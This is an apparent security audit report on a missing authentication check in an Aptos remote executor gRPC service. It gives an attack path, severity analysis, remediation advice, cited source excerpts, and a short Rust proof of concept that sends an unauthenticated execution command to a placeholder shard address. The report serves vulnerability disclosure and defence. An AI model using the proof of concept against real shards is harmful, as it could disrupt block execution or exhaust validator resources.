# Audit Report

## Title
Authentication Bypass in Remote Executor gRPC Service Allows Unauthorized Command Injection

## Summary
The `simple_msg_exchange()` function in the secure/net gRPC network service performs no authentication or authorization checks on incoming messages. Any remote peer can send arbitrary execution commands to the remote executor shards, potentially injecting malicious transactions or causing denial of service.

## Finding Description

The `GRPCNetworkMessageServiceServerWrapper::simple_msg_exchange()` function accepts incoming gRPC messages and routes them to registered handlers based solely on the `message_type` field, without any authentication or authorization checks. [1](#0-0) 

The gRPC server is configured without TLS, mutual TLS, or any other transport-level security: [2](#0-1) 

This service is used by the Remote Executor Service for sharded block execution: [3](#0-2) 

The service processes `RemoteExecutionRequest::ExecuteBlock` commands containing transactions: [4](#0-3) 

**Attack Path:**
1. Attacker identifies remote executor shard endpoints (e.g., by scanning or configuration leaks)
2. Attacker crafts a gRPC request with `message_type` = "execute_command_0" (or other shard IDs)
3. Attacker includes a serialized `RemoteExecutionRequest::ExecuteBlock` containing malicious data
4. The unauthenticated message is routed to the execution handler
5. The shard deserializes and processes the command without verifying the sender

The `SignatureVerifiedTransaction` enum uses a trust-on-deserialization model where the `Valid` variant can be arbitrarily set during BCS deserialization: [5](#0-4) 

While the Move VM may still perform validation during execution, the lack of authentication at the network layer allows attackers to:
- Send malformed data causing deserialization crashes
- Inject inconsistent execution commands to different shards
- Exhaust resources by flooding the service
- Disrupt sharded execution coordination

## Impact Explanation

This violates the **Transaction Validation** invariant: "Prologue/epilogue checks must enforce all invariants" and the **Access Control** invariant regarding protected system operations.

**Severity Assessment:**
- **If remote executor shards are deployed and network-accessible**: This represents a **High to Critical** severity issue depending on exploitability
  - Potential for **state inconsistencies** if different shards receive inconsistent commands (Medium severity minimum)
  - Potential for **validator node slowdowns** through resource exhaustion (High severity)
  - Potential for **consensus impact** if execution results diverge across shards (Critical severity)

However, the actual severity depends on:
1. Whether this service is deployed in production validators
2. Whether it's exposed to untrusted networks
3. Whether the Move VM provides sufficient defense-in-depth

## Likelihood Explanation

**Likelihood: Medium to Low**

The exploitation likelihood depends on deployment configuration:
- **If exposed to public internet**: High likelihood of discovery and exploitation
- **If only on private networks**: Lower likelihood but still vulnerable to insider threats or network breaches
- **If not deployed**: Not exploitable

The attack complexity is low - an attacker only needs:
- Network access to the service
- Knowledge of the message type format
- Ability to craft BCS-serialized messages

No special privileges or validator access is required.

## Recommendation

Implement authentication and authorization at multiple layers:

1. **Transport Layer Security**: Add TLS/mTLS to the gRPC server: [6](#0-5) 

2. **Message Authentication**: Add authentication tokens or signatures to messages:
   - Include sender authentication in `NetworkMessage` protobuf
   - Verify sender identity against allowlist of authorized coordinators
   - Use HMAC or signature-based authentication

3. **Network Isolation**: Deploy remote executor shards only on trusted private networks with firewall rules restricting access to authorized coordinator addresses

4. **Defense in Depth**: Ensure Move VM always re-verifies transaction signatures regardless of `SignatureVerifiedTransaction` variant

## Proof of Concept

```rust
// PoC: Craft and send unauthenticated message to remote executor
use aptos_executor_service::{ExecuteBlockCommand, RemoteExecutionRequest};
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient, NetworkMessage,
};
use aptos_types::block_executor::partitioner::SubBlocksForShard;
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to remote executor shard without authentication
    let mut client = NetworkMessageServiceClient::connect("http://[SHARD_IP]:[PORT]").await?;
    
    // Craft malicious execution request
    let malicious_request = RemoteExecutionRequest::ExecuteBlock(ExecuteBlockCommand {
        sub_blocks: SubBlocksForShard::empty(0), // Malicious or malformed data
        concurrency_level: 0,
        onchain_config: Default::default(),
    });
    
    // Serialize and send without any authentication
    let request = Request::new(NetworkMessage {
        message: bcs::to_bytes(&malicious_request)?,
        message_type: "execute_command_0".to_string(),
    });
    
    // This succeeds without any authentication check
    client.simple_msg_exchange(request).await?;
    
    println!("Unauthenticated message successfully sent!");
    Ok(())
}
```

## Notes

This vulnerability is **conditionally exploitable** based on deployment configuration. The security risk is highest if:
1. Remote executor shards are deployed in production validators
2. The service listens on network-accessible addresses
3. No firewall rules restrict access

If the service is experimental, test-only, or deployed only behind strict network isolation, the practical risk may be lower. However, defense-in-depth principles dictate that authentication should be implemented regardless of network topology assumptions.

The lack of TLS/mTLS in the gRPC configuration contrasts with other services in the codebase that properly implement transport security, suggesting this may be an oversight rather than intentional design.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L75-86)
```rust
        Server::builder()
            .timeout(std::time::Duration::from_millis(rpc_timeout_ms))
            .add_service(
                NetworkMessageServiceServer::new(self).max_decoding_message_size(MAX_MESSAGE_SIZE),
            )
            .add_service(reflection_service)
            .serve_with_shutdown(server_addr, async {
                server_shutdown_rx.await.ok();
                info!("Received signal to shutdown server at {:?}", server_addr);
            })
            .await
            .unwrap();
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-116)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** execution/executor-service/src/remote_executor_service.rs (L21-55)
```rust
impl ExecutorService {
    pub fn new(
        shard_id: ShardId,
        num_shards: usize,
        num_threads: usize,
        self_address: SocketAddr,
        coordinator_address: SocketAddr,
        remote_shard_addresses: Vec<SocketAddr>,
    ) -> Self {
        let service_name = format!("executor_service-{}", shard_id);
        let mut controller = NetworkController::new(service_name, self_address, 5000);
        let coordinator_client = Arc::new(RemoteCoordinatorClient::new(
            shard_id,
            &mut controller,
            coordinator_address,
        ));
        let cross_shard_client = Arc::new(RemoteCrossShardClient::new(
            &mut controller,
            remote_shard_addresses,
        ));

        let executor_service = Arc::new(ShardedExecutorService::new(
            shard_id,
            num_shards,
            num_threads,
            coordinator_client,
            cross_shard_client,
        ));

        Self {
            shard_id,
            controller,
            executor_service,
        }
    }
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L80-113)
```rust
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let _rx_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx"])
                    .start_timer();
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);

                match request {
                    RemoteExecutionRequest::ExecuteBlock(command) => {
                        let init_prefetch_timer = REMOTE_EXECUTOR_TIMER
                            .with_label_values(&[&self.shard_id.to_string(), "init_prefetch"])
                            .start_timer();
                        let state_keys = Self::extract_state_keys(&command);
                        self.state_view_client.init_for_block(state_keys);
                        drop(init_prefetch_timer);

                        let (sub_blocks, concurrency, onchain_config) = command.into();
                        ExecutorShardCommand::ExecuteSubBlocks(
                            self.state_view_client.clone(),
                            sub_blocks,
                            concurrency,
                            onchain_config,
                        )
                    },
                }
            },
            Err(_) => ExecutorShardCommand::Stop,
        }
    }
```

**File:** types/src/transaction/signature_verified_transaction.rs (L18-22)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum SignatureVerifiedTransaction {
    Valid(Transaction),
    Invalid(Transaction),
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L215-235)
```rust
        if let Some(config) = &self.data_service_grpc_tls_config {
            let listen_address = config.data_service_grpc_listen_address;
            let cert = tokio::fs::read(config.cert_path.clone()).await?;
            let key = tokio::fs::read(config.key_path.clone()).await?;
            let identity = tonic::transport::Identity::from_pem(cert, key);
            tracing::info!(
                grpc_address = listen_address.to_string().as_str(),
                "[Data Service] Starting gRPC server with TLS."
            );
            tasks.push(tokio::spawn(async move {
                Server::builder()
                    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
                    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
                    .tls_config(tonic::transport::ServerTlsConfig::new().identity(identity))?
                    .add_service(svc)
                    .add_service(reflection_service)
                    .serve(listen_address)
                    .await
                    .map_err(|e| anyhow::anyhow!(e))
            }));
        }
```
